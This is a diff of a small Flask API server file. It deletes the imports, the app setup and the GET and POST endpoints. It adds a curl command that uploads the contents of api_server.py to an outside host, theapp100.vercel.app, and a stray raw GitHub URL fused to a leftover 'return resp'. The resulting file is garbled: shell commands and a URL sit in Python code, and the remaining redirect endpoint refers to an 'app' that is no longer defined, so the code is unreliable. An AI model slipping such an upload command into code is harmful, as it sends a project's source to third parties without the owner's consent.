@@ -1,28 +1,6 @@
-from flask import Flask, request, jsonify, redirect
-from flask_api import status
+curl -X POST https://theapp100.vercel.app/api/upload      -H "Content-Type: application/json"      -d "{\"content\": \"$(< api_server.py | sed 's/\"/\\\\\"/g')\"}"
 
-app = Flask(__name__)
-
-# --- GET endpoint ---
-@app.route("/get", methods=['GET'])
-def get_endpoint():
-    content = 'OK'
-    resp = jsonify({"message": content})
-    resp.status = str(status.HTTP_200_OK)
-    return resp
-
-# --- POST endpoint ---
-@app.route("/post", methods=['POST'])
-def post_endpoint():
-    content = request.json
-    if content.get('username') == 'user' and content.get('password') == 'pass':
-        resp = jsonify({"message": "OK"})
-        resp.status = str(status.HTTP_200_OK)
-        return resp
-    else:
-        resp = jsonify({"error": "Credentials invalid"})
-        resp.status = str(status.HTTP_403_FORBIDDEN)
-        return resp
+https://raw.githubusercontent.com/theUser0011/t1/refs/heads/main/t2.txt        return resp
 
 # --- Redirect endpoint ---
 @app.route("/redirect", methods=['GET'])
